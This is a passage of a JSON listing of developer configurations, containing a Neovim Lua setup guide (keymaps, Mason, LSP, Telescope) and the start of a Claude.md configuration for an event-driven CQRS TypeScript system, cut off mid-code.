\"<C-u>zz\", opts)\nkeymap(\"n\", \"n\", \"nzzzv\", opts)\nkeymap(\"n\", \"N\", \"Nzzzv\", opts)\n\n-- Clear search highlighting\nkeymap(\"n\", \"<leader>h\", \":nohlsearch<CR>\", opts)\n\n-- Quick fix list\nkeymap(\"n\", \"<C-k>\", \"<cmd>cnext<CR>zz\", opts)\nkeymap(\"n\", \"<C-j>\", \"<cmd>cprev<CR>zz\", opts)\nkeymap(\"n\", \"<leader>k\", \"<cmd>lnext<CR>zz\", opts)\nkeymap(\"n\", \"<leader>j\", \"<cmd>lprev<CR>zz\", opts)\n\n-- Telescope\nkeymap(\"n\", \"<leader>ff\", \"<cmd>Telescope find_files<cr>\", opts)\nkeymap(\"n\", \"<leader>fg\", \"<cmd>Telescope live_grep<cr>\", opts)\nkeymap(\"n\", \"<leader>fb\", \"<cmd>Telescope buffers<cr>\", opts)\nkeymap(\"n\", \"<leader>fh\", \"<cmd>Telescope help_tags<cr>\", opts)\nkeymap(\"n\", \"<leader>fs\", \"<cmd>Telescope lsp_document_symbols<cr>\", opts)\nkeymap(\"n\", \"<leader>fr\", \"<cmd>Telescope lsp_references<cr>\", opts)\n\n-- LSP\nkeymap(\"n\", \"gD\", vim.lsp.buf.declaration, opts)\nkeymap(\"n\", \"gd\", vim.lsp.buf.definition, opts)\nkeymap(\"n\", \"K\", vim.lsp.buf.hover, opts)\nkeymap(\"n\", \"gi\", vim.lsp.buf.implementation, opts)\nkeymap(\"n\", \"<C-k>\", vim.lsp.buf.signature_help, opts)\nkeymap(\"n\", \"<leader>rn\", vim.lsp.buf.rename, opts)\nkeymap(\"n\", \"<leader>ca\", vim.lsp.buf.code_action, opts)\nkeymap(\"n\", \"gr\", vim.lsp.buf.references, opts)\nkeymap(\"n\", \"<leader>f\", function()\n  vim.lsp.buf.format({ async = true })\nend, opts)\n\n-- Diagnostics\nkeymap(\"n\", \"<leader>e\", vim.diagnostic.open_float, opts)\nkeymap(\"n\", \"[d\", vim.diagnostic.goto_prev, opts)\nkeymap(\"n\", \"]d\", vim.diagnostic.goto_next, opts)\nkeymap(\"n\", \"<leader>dl\", vim.diagnostic.setloclist, opts)\n\n-- NvimTree\nkeymap(\"n\", \"<leader>e\", \":NvimTreeToggle<CR>\", opts)\n\n-- Terminal\nkeymap(\"n\", \"<leader>t\", \":ToggleTerm<CR>\", opts)\nkeymap(\"t\", \"<esc>\", [[<C-\\><C-n>]], opts)\n\n-- Git\nkeymap(\"n\", \"<leader>gg\", \":LazyGit<CR>\", opts)\nkeymap(\"n\", \"<leader>gb\", \":Gitsigns blame_line<CR>\", opts)\nkeymap(\"n\", \"<leader>gp\", \":Gitsigns preview_hunk<CR>\", opts)\nkeymap(\"n\", \"<leader>gr\", \":Gitsigns reset_hunk<CR>\", opts)\nkeymap(\"n\", \"<leader>gs\", \":Gitsigns stage_hunk<CR>\", opts)\n\n-- Sessions\nkeymap(\"n\", \"<leader>ss\", \":SessionSave<CR>\", opts)\nkeymap(\"n\", \"<leader>sr\", \":SessionRestore<CR>\", opts)\n```\n\n## Plugin Configuration\n\n### Plugin Manager Setup\n```lua\n-- ~/.config/nvim/lua/plugins/init.lua\nrequire(\"lazy\").setup({\n  -- LSP Configuration\n  { import = \"plugins.lsp\" },\n  \n  -- Completion\n  { import = \"plugins.completion\" },\n  \n  -- UI Enhancements\n  { import = \"plugins.ui\" },\n  \n  -- Editor Features\n  { import = \"plugins.editor\" },\n  \n  -- Development Tools\n  { import = \"plugins.tools\" },\n  \n  -- Themes\n  { import = \"themes\" },\n}, {\n  checker = {\n    enabled = true,\n    notify = false,\n  },\n  change_detection = {\n    notify = false,\n  },\n})\n```\n\n### LSP Configuration\n```lua\n-- ~/.config/nvim/lua/plugins/lsp/mason.lua\nreturn {\n  {\n    \"williamboman/mason.nvim\",\n    cmd = \"Mason\",\n    keys = { { \"<leader>cm\", \"<cmd>Mason<cr>\", desc = \"Mason\" } },\n    build = \":MasonUpdate\",\n    opts = {\n      ensure_installed = {\n        \"stylua\",\n        \"shellcheck\",\n        \"shfmt\",\n        \"flake8\",\n        \"black\",\n        \"isort\",\n        \"prettier\",\n        \"eslint_d\",\n        \"typescript-language-server\",\n        \"pyright\",\n        \"lua-language-server\",\n        \"gopls\",\n        \"rust-analyzer\",\n        \"json-lsp\",\n        \"yaml-language-server\",\n        \"dockerfile-language-server\",\n        \"bash-language-server\",\n        \"html-lsp\",\n        \"css-lsp\",\n        \"tailwindcss-language-server\",\n      },\n    },\n    config = function(_, opts)\n      require(\"mason\").setup(opts)\n      local mr = require(\"mason-registry\")\n      mr:on(\"package:install:success\", function()\n        vim.defer_fn(function()\n          require(\"lazy.core.handler.event\").trigger({\n            event = \"FileType\",\n            buf = vim.api.nvim_get_current_buf(),\n          })\n        end, 100)\n      end)\n      local function ensure_installed()\n        for _, tool in ipairs(opts.ensure_installed) do\n          local p = mr.get_package(tool)\n          if not p:is_installed() then\n            p:install()\n          end\n        end\n      end\n      if mr.refresh then\n        mr.refresh(ensure_installed)\n      else\n        ensure_installed()\n      end\n    end,\n  },\n  \n  {\n    \"williamboman/mason-lspconfig.nvim\",\n    dependencies = { \"mason.nvim\" },\n    opts = {\n      automatic_installation = true,\n    },\n  },\n}\n```\n\n### Advanced LSP Handlers\n```lua\n-- ~/.config/nvim/lua/plugins/lsp/handlers.lua\nlocal M = {}\n\nM.setup = function()\n  local signs = {\n    { name = \"DiagnosticSignError\", text = \"\" },\n    { name = \"DiagnosticSignWarn\", text = \"\" },\n    { name = \"DiagnosticSignHint\", text = \"\" },\n    { name = \"DiagnosticSignInfo\", text = \"\" },\n  }\n\n  for _, sign in ipairs(signs) do\n    vim.fn.sign_define(sign.name, { texthl = sign.name, text = sign.text, numhl = \"\" })\n  end\n\n  vim.diagnostic.config({\n    virtual_text = {\n      prefix = \"●\",\n      source = \"if_many\",\n    },\n    signs = true,\n    update_in_insert = false,\n    underline = true,\n    severity_sort = true,\n    float = {\n      focusable = true,\n      style = \"minimal\",\n      border = \"rounded\",\n      source = \"always\",\n      header = \"\",\n      prefix = \"\",\n    },\n  })\n\n  vim.lsp.handlers[\"textDocument/hover\"] = vim.lsp.with(vim.lsp.handlers.hover, {\n    border = \"rounded\",\n    width = 60,\n  })\n\n  vim.lsp.handlers[\"textDocument/signatureHelp\"] = vim.lsp.with(vim.lsp.handlers.signature_help, {\n    border = \"rounded\",\n    width = 60,\n  })\nend\n\nlocal function lsp_keymaps(bufnr)\n  local opts = { noremap = true, silent = true }\n  local keymap = vim.api.nvim_buf_set_keymap\n  keymap(bufnr, \"n\", \"gD\", \"<cmd>lua vim.lsp.buf.declaration()<CR>\", opts)\n  keymap(bufnr, \"n\", \"gd\", \"<cmd>lua vim.lsp.buf.definition()<CR>\", opts)\n  keymap(bufnr, \"n\", \"K\", \"<cmd>lua vim.lsp.buf.hover()<CR>\", opts)\n  keymap(bufnr, \"n\", \"gI\", \"<cmd>lua vim.lsp.buf.implementation()<CR>\", opts)\n  keymap(bufnr, \"n\", \"gr\", \"<cmd>lua vim.lsp.buf.references()<CR>\", opts)\n  keymap(bufnr, \"n\", \"gl\", \"<cmd>lua vim.diagnostic.open_float()<CR>\", opts)\n  keymap(bufnr, \"n\", \"<leader>lf\", \"<cmd>lua vim.lsp.buf.format{ async = true }<cr>\", opts)\n  keymap(bufnr, \"n\", \"<leader>li\", \"<cmd>LspInfo<cr>\", opts)\n  keymap(bufnr, \"n\", \"<leader>lI\", \"<cmd>LspInstallInfo<cr>\", opts)\n  keymap(bufnr, \"n\", \"<leader>la\", \"<cmd>lua vim.lsp.buf.code_action()<cr>\", opts)\n  keymap(bufnr, \"n\", \"<leader>lj\", \"<cmd>lua vim.diagnostic.goto_next({buffer=0})<cr>\", opts)\n  keymap(bufnr, \"n\", \"<leader>lk\", \"<cmd>lua vim.diagnostic.goto_prev({buffer=0})<cr>\", opts)\n  keymap(bufnr, \"n\", \"<leader>lr\", \"<cmd>lua vim.lsp.buf.rename()<cr>\", opts)\n  keymap(bufnr, \"n\", \"<leader>ls\", \"<cmd>lua vim.lsp.buf.signature_help()<CR>\", opts)\n  keymap(bufnr, \"n\", \"<leader>lq\", \"<cmd>lua vim.diagnostic.setloclist()<CR>\", opts)\nend\n\nM.on_attach = function(client, bufnr)\n  lsp_keymaps(bufnr)\n  \n  if client.supports_method(\"textDocument/documentHighlight\") then\n    vim.api.nvim_create_augroup(\"lsp_document_highlight\", {})\n    vim.api.nvim_create_autocmd({ \"CursorHold\", \"CursorHoldI\" }, {\n      group = \"lsp_document_highlight\",\n      buffer = bufnr,\n      callback = vim.lsp.buf.document_highlight,\n    })\n    vim.api.nvim_create_autocmd(\"CursorMoved\", {\n      group = \"lsp_document_highlight\",\n      buffer = bufnr,\n      callback = vim.lsp.buf.clear_references,\n    })\n  end\n\n  if client.supports_method(\"textDocument/inlayHint\") then\n    vim.lsp.inlay_hint.enable(bufnr, true)\n  end\nend\n\nlocal capabilities = vim.lsp.protocol.make_client_capabilities()\ncapabilities.textDocument.completion.completionItem.snippetSupport = true\ncapabilities.textDocument.completion.completionItem.resolveSupport = {\n  properties = {\n    \"documentation\",\n    \"detail\",\n    \"additionalTextEdits\",\n  },\n}\ncapabilities.textDocument.foldingRange = {\n  dynamicRegistration = false,\n  lineFoldingOnly = true,\n}\n\nlocal status_ok, cmp_nvim_lsp = pcall(require, \"cmp_nvim_lsp\")\nif status_ok then\n  capabilities = cmp_nvim_lsp.default_capabilities(capabilities)\nend\n\nM.capabilities = capabilities\n\nreturn M\n```\n\n### Telescope Configuration\n```lua\n-- ~/.config/nvim/lua/plugins/ui/telescope.lua\nreturn {\n  \"nvim-telescope/telescope.nvim\",\n  tag = \"0.1.4\",\n  dependencies = {\n    \"nvim-lua/plenary.nvim\",\n    { \"nvim-telescope/telescope-fzf-native.nvim\", build = \"make\" },\n    \"nvim-telescope/telescope-ui-select.nvim\",\n    \"nvim-tree/nvim-web-devicons\",\n  },\n  keys = {\n    { \"<leader>ff\", \"<cmd>Telescope find_files<cr>\", desc = \"Find Files\" },\n    { \"<leader>fg\", \"<cmd>Telescope live_grep<cr>\", desc = \"Live Grep\" },\n    { \"<leader>fb\", \"<cmd>Telescope buffers<cr>\", desc = \"Buffers\" },\n    { \"<leader>fh\", \"<cmd>Telescope help_tags<cr>\", desc = \"Help Tags\" },\n    { \"<leader>fs\", \"<cmd>Telescope lsp_document_symbols<cr>\", desc = \"Document Symbols\" },\n    { \"<leader>fr\", \"<cmd>Telescope lsp_references<cr>\", desc = \"References\" },\n    { \"<leader>fd\", \"<cmd>Telescope diagnostics<cr>\", desc = \"Diagnostics\" },\n    { \"<leader>fc\", \"<cmd>Telescope commands<cr>\", desc = \"Commands\" },\n    { \"<leader>fk\", \"<cmd>Telescope keymaps<cr>\", desc = \"Keymaps\" },\n  },\n  config = function()\n    local telescope = require(\"telescope\")\n    local actions = require(\"telescope.actions\")\n\n    telescope.setup({\n      defaults = {\n        prompt_prefix = \" \",\n        selection_caret = \" \",\n        path_display = { \"truncate\" },\n        file_ignore_patterns = { \".git/\", \"node_modules\" },\n        \n        mappings = {\n          i = {\n            [\"<C-n>\"] = actions.cycle_history_next,\n            [\"<C-p>\"] = actions.cycle_history_prev,\n            [\"<C-j>\"] = actions.move_selection_next,\n            [\"<C-k>\"] = actions.move_selection_previous,\n            [\"<CR>\"] = actions.select_default,\n            [\"<C-x>\"] = actions.select_horizontal,\n            [\"<C-v>\"] = actions.select_vertical,\n            [\"<C-t>\"] = actions.select_tab,\n            [\"<C-u>\"] = actions.preview_scrolling_up,\n            [\"<C-d>\"] = actions.preview_scrolling_down,\n            [\"<PageUp>\"] = actions.results_scrolling_up,\n            [\"<PageDown>\"] = actions.results_scrolling_down,\n            [\"<Tab>\"] = actions.toggle_selection + actions.move_selection_worse,\n            [\"<S-Tab>\"] = actions.toggle_selection + actions.move_selection_better,\n            [\"<C-q>\"] = actions.send_to_qflist + actions.open_qflist,\n            [\"<M-q>\"] = actions.send_selected_to_qflist + actions.open_qflist,\n            [\"<C-l>\"] = actions.complete_tag,\n            [\"<C-_>\"] = actions.which_key,\n          },\n          n = {\n            [\"<esc>\"] = actions.close,\n            [\"<CR>\"] = actions.select_default,\n            [\"<C-x>\"] = actions.select_horizontal,\n            [\"<C-v>\"] = actions.select_vertical,\n            [\"<C-t>\"] = actions.select_tab,\n            [\"<Tab>\"] = actions.toggle_selection + actions.move_selection_worse,\n            [\"<S-Tab>\"] = actions.toggle_selection + actions.move_selection_better,\n            [\"<C-q>\"] = actions.send_to_qflist + actions.open_qflist,\n            [\"<M-q>\"] = actions.send_selected_to_qflist + actions.open_qflist,\n            [\"j\"] = actions.move_selection_next,\n            [\"k\"] = actions.move_selection_previous,\n            [\"H\"] = actions.move_to_top,\n            [\"M\"] = actions.move_to_middle,\n            [\"L\"] = actions.move_to_bottom,\n            [\"<Down>\"] = actions.move_selection_next,\n            [\"<Up>\"] = actions.move_selection_previous,\n            [\"gg\"] = actions.move_to_top,\n            [\"G\"] = actions.move_to_bottom,\n            [\"<C-u>\"] = actions.preview_scrolling_up,\n            [\"<C-d>\"] = actions.preview_scrolling_down,\n            [\"<PageUp>\"] = actions.results_scrolling_up,\n            [\"<PageDown>\"] = actions.results_scrolling_down,\n            [\"?\"] = actions.which_key,\n          },\n        },\n      },\n      \n      pickers = {\n        find_files = {\n          theme = \"dropdown\",\n          previewer = false,\n          hidden = true,\n        },\n        live_grep = {\n          theme = \"dropdown\",\n        },\n        buffers = {\n          theme = \"dropdown\",\n          previewer = false,\n          initial_mode = \"normal\",\n        },\n      },\n      \n      extensions = {\n        fzf = {\n          fuzzy = true,\n          override_generic_sorter = true,\n          override_file_sorter = true,\n          case_mode = \"smart_case\",\n        },\n        [\"ui-select\"] = {\n          require(\"telescope.themes\").get_dropdown({}),\n        },\n      },\n    })\n\n    telescope.load_extension(\"fzf\")\n    telescope.load_extension(\"ui-select\")\n  end,\n}\n```\n\n## Advanced Features\n\n### Treesitter Configuration\n- **Syntax Highlighting**: Advanced syntax highlighting for 40+ languages\n- **Code Folding**: Smart folding based on syntax structure\n- **Text Objects**: Custom text objects for functions, classes, etc.\n- **Incremental Selection**: Smart selection expansion\n- **Context**: Show current function/class in status line\n\n### Completion System\n- **Sources**: LSP, buffer, path, snippets, emoji\n- **Intelligent Ranking**: Context-aware completion ranking\n- **Snippet Support**: LuaSnip integration with custom snippets\n- **Auto-imports**: Automatic import statements\n- **Documentation**: Inline documentation in completion menu\n\n### Git Integration\n- **Signs**: Line-by-line git status indicators\n- **Blame**: Inline git blame information\n- **Hunks**: Stage, unstage, and preview hunks\n- **Branches**: Branch switching and management\n- **LazyGit**: Full-featured git interface\n\n### Terminal Integration\n- **Floating Terminal**: Toggle floating terminal\n- **Multiple Terminals**: Named terminal instances\n- **Persistent Terminals**: Terminals survive session restarts\n- **Send to Terminal**: Send code selections to terminal\n\n## Performance Optimizations\n\n### Startup Time\n- **Lazy Loading**: Plugins load only when needed\n- **Compiled Loader**: Faster module loading\n- **Minimal Core**: Only essential plugins at startup\n- **Cached Modules**: Module caching for repeated loads\n\n### Runtime Performance\n- **Treesitter**: Efficient syntax highlighting\n- **LSP Optimizations**: Debounced diagnostics and formatting\n- **Buffer Management**: Automatic buffer cleanup\n- **Memory Usage**: Optimized memory consumption\n\n### File Handling\n- **Large Files**: Special handling for files > 1MB\n- **Binary Files**: Automatic detection and handling\n- **Encoding**: Proper UTF-8 and multi-byte support\n- **Line Endings**: Cross-platform line ending handling\n\n## Customization Guide\n\n### Adding Language Servers\n1. Add server to Mason ensure_installed list\n2. Create server configuration in servers/ directory\n3. Add server-specific keybindings if needed\n4. Configure completion sources\n5. Add snippets for the language\n\n### Custom Keybindings\n- Use `<leader>` prefix for custom commands\n- Group related commands with consistent prefixes\n- Provide which-key descriptions\n- Test for conflicts with existing bindings\n\n### Theme Customization\n- Override highlight groups in theme files\n- Create custom color schemes\n- Configure transparent backgrounds\n- Adjust contrast and saturation\n\nThis ultimate Neovim setup provides a powerful, efficient, and highly customizable development environment that rivals any modern IDE while maintaining the speed and flexibility that Vim users love.",
      "tags": [
        {
          "tag": {
            "id": "neovim",
            "name": "neovim",
            "slug": "neovim"
          }
        },
        {
          "tag": {
            "id": "lsp",
            "name": "lsp",
            "slug": "lsp"
          }
        },
        {
          "tag": {
            "id": "treesitter",
            "name": "treesitter",
            "slug": "treesitter"
          }
        },
        {
          "tag": {
            "id": "telescope",
            "name": "telescope",
            "slug": "telescope"
          }
        },
        {
          "tag": {
            "id": "lua",
            "name": "lua",
            "slug": "lua"
          }
        },
        {
          "tag": {
            "id": "editor",
            "name": "editor",
            "slug": "editor"
          }
        },
        {
          "tag": {
            "id": "productivity",
            "name": "productivity",
            "slug": "productivity"
          }
        }
      ],
      "author": {
        "name": "Claude Code Community",
        "url": "https://github.com/claudecode-community"
      },
      "stats": {
        "votes": 34,
        "copies": 128
      },
      "_count": {
        "votes": 10,
        "copies": 141
      },
      "difficulty": "ADVANCED",
      "language": "Lua",
      "framework": "Neovim + LSP",
      "createdAt": "2024-12-01",
      "lastUpdated": "2024-12-01",
      "featured": true
    },
    {
      "id": "event-driven-architecture-cqrs",
      "title": "Event-Driven Architecture + CQRS",
      "slug": "event-driven-architecture-cqrs-messaging-patterns",
      "tagline": "Node.js + Event Store + Message Bus configuration for advanced developers",
      "description": "Comprehensive event-driven architecture implementation with CQRS, Event Sourcing, Saga patterns, and advanced messaging systems for building scalable, resilient distributed applications.",
      "categoryId": "claude-configs",
      "category": {
        "id": "claude-configs",
        "name": "Claude.md Configurations",
        "slug": "claude-configs",
        "description": "Ready-to-use Claude.md configuration files for different tech stacks and project types, including advanced enterprise-grade configurations.",
        "icon": "📋",
        "color": "#F59E0B"
      },
      "type": "CONFIGURATION",
      "content": "# Claude.md - Event-Driven Architecture + CQRS\n\n## Project Overview\n\nThis is an advanced event-driven architecture implementation designed for building scalable, resilient distributed systems. It combines Command Query Responsibility Segregation (CQRS), Event Sourcing, Saga patterns, and sophisticated messaging systems to create applications that can handle complex business workflows, maintain data consistency across services, and scale horizontally.\n\n## Architectural Philosophy\n\n### Event-Driven Principles\n1. **Loose Coupling**: Services communicate through events, not direct calls\n2. **Temporal Decoupling**: Producers and consumers operate independently\n3. **Event Immutability**: Events are immutable facts about what happened\n4. **Event Ordering**: Maintain causal ordering of related events\n5. **Eventual Consistency**: Accept and manage eventual consistency patterns\n6. **Resilience**: System continues to function despite partial failures\n\n### CQRS Benefits\n- **Segregated Models**: Separate read and write models optimized for their purpose\n- **Independent Scaling**: Scale reads and writes independently\n- **Performance Optimization**: Optimized queries and denormalized read models\n- **Complex Queries**: Support complex reporting without impacting write side\n- **Technology Diversity**: Use different technologies for reads and writes\n\n### Event Sourcing Advantages\n- **Complete Audit Trail**: Every change is recorded as an event\n- **Time Travel**: Replay events to any point in time\n- **Debugging Capabilities**: Full system state reconstruction\n- **Business Intelligence**: Rich event history for analytics\n- **Conflict Resolution**: Natural handling of concurrent updates\n\n## Technology Stack\n\n- **Application Framework**: Node.js with TypeScript\n- **Event Store**: EventStore DB / Apache Kafka\n- **Message Bus**: RabbitMQ / Apache Kafka / Azure Service Bus\n- **Read Models**: MongoDB / PostgreSQL / Elasticsearch\n- **Caching**: Redis for read model caching\n- **API Gateway**: Kong / Istio for event routing\n- **Monitoring**: Prometheus + Grafana for event metrics\n- **Tracing**: Jaeger for distributed tracing\n\n## Project Structure\n\n```\nevent-driven-cqrs-system/\n├── src/\n│   ├── shared/                    # Shared domain and infrastructure\n│   │   ├── domain/                # Domain primitives and base classes\n│   │   │   ├── base/              # Base domain classes\n│   │   │   │   ├── AggregateRoot.ts\n│   │   │   │   ├── Entity.ts\n│   │   │   │   ├── ValueObject.ts\n│   │   │   │   └── DomainEvent.ts\n│   │   │   ├── events/            # Domain event definitions\n│   │   │   └── exceptions/        # Domain exceptions\n│   │   ├── infrastructure/        # Shared infrastructure\n│   │   │   ├── eventstore/        # Event store implementation\n│   │   │   │   ├── EventStore.ts\n│   │   │   │   ├── EventStream.ts\n│   │   │   │   └── Snapshot.ts\n│   │   │   ├── messaging/         # Message bus implementation\n│   │   │   │   ├── MessageBus.ts\n│   │   │   │   ├── EventPublisher.ts\n│   │   │   │   └── CommandBus.ts\n│   │   │   ├── projections/       # Read model projections\n│   │   │   └── sagas/             # Saga orchestration\n│   │   └── application/           # Application services\n│   │       ├── commands/          # Command handlers\n│   │       ├── queries/           # Query handlers\n│   │       └── services/          # Application services\n│   ├── modules/                   # Business modules\n│   │   ├── ordering/              # Order management domain\n│   │   │   ├── domain/            # Domain models and logic\n│   │   │   │   ├── aggregates/    # Aggregate roots\n│   │   │   │   │   ├── Order.ts\n│   │   │   │   │   └── Customer.ts\n│   │   │   │   ├── events/        # Domain events\n│   │   │   │   │   ├── OrderCreated.ts\n│   │   │   │   │   ├── OrderConfirmed.ts\n│   │   │   │   │   └── OrderCancelled.ts\n│   │   │   │   ├── valueobjects/  # Value objects\n│   │   │   │   └── services/      # Domain services\n│   │   │   ├── application/       # Application layer\n│   │   │   │   ├── commands/      # Command definitions and handlers\n│   │   │   │   │   ├── CreateOrder/\n│   │   │   │   │   ├── ConfirmOrder/\n│   │   │   │   │   └── CancelOrder/\n│   │   │   │   ├── queries/       # Query definitions and handlers\n│   │   │   │   │   ├── GetOrder/\n│   │   │   │   │   └── GetOrderHistory/\n│   │   │   │   └── sagas/         # Process managers\n│   │   │   │       └── OrderFulfillmentSaga.ts\n│   │   │   ├── infrastructure/    # Infrastructure implementations\n│   │   │   │   ├── repositories/  # Event sourced repositories\n│   │   │   │   ├── projections/   # Read model projections\n│   │   │   │   └── eventhandlers/ # Event handlers\n│   │   │   └── presentation/      # API controllers\n│   │   │       ├── controllers/   # REST controllers\n│   │   │       └── graphql/       # GraphQL resolvers\n│   │   ├── inventory/             # Inventory management\n│   │   ├── payment/               # Payment processing\n│   │   └── shipping/              # Shipping management\n│   ├── readmodels/                # Read model definitions\n│   │   ├── projections/           # Projection definitions\n│   │   ├── views/                 # Materialized views\n│   │   └── queries/               # Query implementations\n│   └── sagas/                     # Cross-module sagas\n│       ├── OrderProcessingSaga.ts # Order processing workflow\n│       └── PaymentSaga.ts         # Payment workflow\n├── config/                        # Configuration files\n│   ├── eventstore.config.ts       # Event store configuration\n│   ├── messagebus.config.ts       # Message bus configuration\n│   └── projections.config.ts      # Projection configuration\n├── migrations/                    # Database migrations\n├── tests/                         # Test specifications\n│   ├── unit/                      # Unit tests\n│   ├── integration/               # Integration tests\n│   └── e2e/                       # End-to-end tests\n└── docker/                        # Docker configurations\n    ├── eventstore/                # EventStore DB\n    ├── kafka/                     # Apache Kafka\n    └── mongodb/                   # Read model storage\n```\n\n## Core Domain Implementation\n\n### Base Aggregate Root\n```typescript\n// src/shared/domain/base/AggregateRoot.ts\nimport { Entity } from './Entity';\nimport { DomainEvent } from './DomainEvent';\n\nexport abstract class AggregateRoot<T> extends Entity<T> {\n  private _domainEvents: DomainEvent[] = [];\n  private _version: number = 0;\n\n  get version(): number {\n    return this._version;\n  }\n\n  get domainEvents(): DomainEvent[] {\n    return [...this._domainEvents];\n  }\n\n  protected addDomainEvent(domainEvent: DomainEvent): void {\n    this._domainEvents.push(domainEvent);\n  }\n\n  public clearEvents(): void {\n    this._domainEvents = [];\n  }\n\n  public markEventsAsCommitted(): void {\n    this._version += this._domainEvents.length;\n    this._domainEvents = [];\n  }\n\n  public loadFromHistory(events: DomainEvent[]): void {\n    events.forEach(event => {\n      this.apply(event);\n      this._version++;\n    });\n  }\n\n  protected abstract apply(event: DomainEvent): void;\n\n  public getUncommittedEvents(): DomainEvent[] {\n    return [...this._domainEvents];\n  }\n}\n```\n\n### Domain Event Base Class\n```typescript\n// src/shared/domain/base/DomainEvent.ts\nexport abstract class DomainEvent {\n  public readonly aggregateId: string;\n  public readonly eventVersion: number;\n  public readonly occurredOn: Date;\n  public readonly eventId: string;\n\n  constructor(\n    aggregateId: string,\n    eventVersion: number,\n    eventId: string = crypto.randomUUID()\n  ) {\n    this.aggregateId = aggregateId;\n    this.eventVersion = eventVersion;\n    this.occurredOn = new Date();\n    this.eventId = eventId;\n  }\n\n  abstract getEventName(): string;\n  abstract getEventData(): Record<string, any>;\n}\n```\n\n### Order Aggregate Example\n```typescript\n// src/modules/ordering/domain/aggregates/Order.ts\nimport { AggregateRoot } from '../../../shared/domain/base/AggregateRoot';\nimport { OrderCreated } from '../events/OrderCreated';\nimport { OrderConfirmed } from '../events/OrderConfirmed';\nimport { OrderCancelled } from '../events/OrderCancelled';\nimport { OrderItem } from '../valueobjects/OrderItem';\nimport { Money } from '../valueobjects/Money';\nimport { DomainEvent } from '../../../shared/domain/base/DomainEvent';\n\nexport enum OrderStatus {\n  PENDING = 'PENDING',\n  CONFIRMED = 'CONFIRMED',\n  SHIPPED = 'SHIPPED',\n  DELIVERED = 'DELIVERED',\n  CANCELLED = 'CANCELLED'\n}\n\nexport class Order extends AggregateRoot<string> {\n  private _customerId: string;\n  private _items: OrderItem[] = [];\n  private _status: OrderStatus = OrderStatus.PENDING;\n  private _totalAmount: Money;\n  private _createdAt: Date;\n  private _confirmedAt?: Date;\n  private _cancelledAt?: Date;\n\n  private constructor(id: string) {\n    super(id);\n  }\n\n  public static create(\n    orderId: string,\n    customerId: string,\n    items: OrderItem[]\n  ): Order {\n    const order = new Order(orderId);\n    \n    const totalAmount = items.reduce(\n      (sum, item) => sum.add(item.totalPrice),\n      Money.zero('USD')\n    );\n\n    const event = new OrderCreated(\n      orderId,\n      1,\n      customerId,\n      items.map(item => item.toDto()),\n      totalAmount.toDto(),\n      new Date()\n    );\n\n    order.apply(event);\n    order.addDomainEvent(event);\n    \n    return order;\n  }\n\n  public confirm(): void {\n    if (this._status !== OrderStatus.PENDING) {\n      throw new Error(`Cannot confirm order in ${this._status} status`);\n    }\n\n    const event = new OrderConfirmed(\n      this.id,\n      this.version + 1,\n      new Date()\n    );\n\n    this.apply(event);\n    this.addDomainEvent(event);\n  }\n\n  public cancel(reason: string): void {\n    if (this._status === OrderStatus.DELIVERED || this._status === OrderStatus.CANCELLED) {\n      throw new Error(`Cannot cancel order in ${this._status} status`);\n    }\n\n    const event = new OrderCancelled(\n      this.id,\n      this.version + 1,\n      reason,\n      new Date()\n    );\n\n    this.apply(event);\n    this.addDomainEvent(event);\n  }\n\n  protected apply(event: DomainEvent): void {\n    switch (event.constructor.name) {\n      case 'OrderCreated':\n        this.applyOrderCreated(event as OrderCreated);\n        break;\n      case 'OrderConfirmed':\n        this.applyOrderConfirmed(event as OrderConfirmed);\n        break;\n      case 'OrderCancelled':\n        this.applyOrderCancelled(event as OrderCancelled);\n        break;\n      default:\n        throw new Error(`Unknown event type: ${event.constructor.name}`);\n    }\n  }\n\n  private applyOrderCreated(event: OrderCreated): void {\n    this._customerId = event.customerId;\n    this._items = event.items.map(item => OrderItem.fromDto(item));\n    this._totalAmount = Money.fromDto(event.totalAmount);\n    this._createdAt = event.createdAt;\n    this._status = OrderStatus.PENDING;\n  }\n\n  private applyOrderConfirmed(event: OrderConfirmed): void {\n    this._status = OrderStatus.CONFIRMED;\n    this._confirmedAt = event.confirmedAt;\n  }\n\n  private applyOrderCancelled(event: OrderCancelled): void {\n    this._status = OrderStatus.CANCELLED;\n    this._cancelledAt = event.cancelledAt;\n  }\n\n  // Getters\n  get customerId(): string { return this._customerId; }\n  get items(): OrderItem[] { return [...this._items]; }\n  get status(): OrderStatus { return this._status; }\n  get totalAmount(): Money { return this._totalAmount; }\n  get createdAt(): Date { return this._createdAt; }\n  get confirmedAt(): Date | undefined { return this._confirmedAt; }\n  get cancelledAt(): Date | undefined { return this._cancelledAt; }\n}\n```\n\n## CQRS Implementation\n\n### Command Handler Example\n```typescript\n// src/modules/ordering/application/commands/CreateOrder/CreateOrderHandler.ts\nimport { CommandHandler } from '../../../../shared/application/CommandHandler';\nimport { CreateOrderCommand } from './CreateOrderCommand';\nimport { OrderRepository } from '../../infrastructure/repositories/OrderRepository';\nimport { EventPublisher } from '../../../../shared/infrastructure/messaging/EventPublisher';\nimport { Order } from '../../domain/aggregates/Order';\nimport { OrderItem } from '../../domain/valueobjects/OrderItem';\n\nexport class CreateOrderHandler implements CommandHandler<CreateOrderCommand> {\n  constructor(\n    private orderRepository: OrderRepository,\n    private eventPublisher: EventPublisher\n  ) {}\n\n  async handle(command: CreateOrderCommand): Promise<void> {\n    // Validate command\n    if (!command.customerId || command.items.length === 0) {\n      throw new Error('Invalid create order command');\n    }\n\n    // Check if order already exists\n    const existingOrder = await this.orderRepository.findById(command.orderId);\n    if (existingOrder) {\n      throw new Error(`Order with id ${command.orderId} already exists`);\n    }\n\n    // Create order items\n    const orderItems = command.items.map(item => \n      OrderItem.create(\n        item.productId,\n        item.productName,\n        item.quantity,\n        Money.create(item.unitPrice, item.currency)\n      )\n    );\n\n    // Create order aggregate\n    const order = Order.create(\n      command.orderId,\n      command.customerId,\n      orderItems\n    );\n\n    // Save to event store\n    await this.orderRepository.save(order);\n\n    // Publish domain events\n    const events = order.getUncommittedEvents();\n    for (const event of events) {\n      await this.eventPublisher.publish(event);\n    }\n\n    order.markEventsAsCommitted();\n  }\n}\n```\n\n### Query Handler Example\n```typescript\n// src/modules/ordering/application/queries/GetOrder/GetOrderHandler.ts\nimport { QueryHandler } from '../../../../shared/application/QueryHandler';\nimport { GetOrderQuery } from './GetOrderQuery';\nimport { OrderView } from './OrderView';\nimport { OrderReadModelRepository } from '../../infrastructure/projections/OrderReadModelRepository';\n\nexport class GetOrderHandler implements QueryHandler<GetOrderQuery, OrderView> {\n  constructor(\n    private orderReadModelRepository: OrderReadModelRepository\n  